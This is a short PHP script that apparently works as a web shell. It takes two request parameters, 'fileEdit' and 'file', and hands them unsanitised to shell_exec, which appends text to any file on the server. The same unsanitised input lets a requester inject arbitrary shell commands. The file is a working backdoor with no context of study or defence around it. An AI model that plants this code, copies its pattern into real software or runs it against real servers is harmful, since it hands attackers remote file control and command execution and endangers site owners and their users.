<?php
echo "start";
if(function_exists('shell_exec'))
	shell_exec('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
?>